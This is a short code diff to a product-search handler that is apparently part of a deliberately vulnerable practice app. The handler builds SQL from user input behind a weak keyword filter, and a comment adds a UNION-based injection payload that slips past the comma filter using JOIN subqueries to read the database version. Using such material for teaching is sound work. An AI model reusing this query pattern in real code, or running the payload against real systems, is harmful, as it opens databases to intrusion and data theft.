@@ -189,7 +189,9 @@ exports.searchProductsVulnerableMedium = async (req, res, next) => {
     try {
         let keyword = req.query.keyword || '';
         keyword = keyword.replace(/OR|AND|,|;|"/gi, '');
-        const query = `SELECT * FROM Products WHERE name LIKE '%${keyword}%'`;
+        const query = `SELECT * FROM Products WHERE name LIKE '%${keyword}%'`; 
+        // to get the database version:
+        // select * from products where name like '%' UNION SELECT * FROM (SELECT NULL)c1 JOIN (SELECT @@version)c2 JOIN (SELECT NULL)c3 JOIN (SELECT NULL)c4 JOIN (SELECT NULL)c5 JOIN (SELECT NULL)c6 JOIN (SELECT NULL)c7 JOIN (SELECT NULL)c8 JOIN (SELECT NULL)c9 JOIN (SELECT NULL)c10 # '
 
         const [results] = await sequelize.query(query);
 
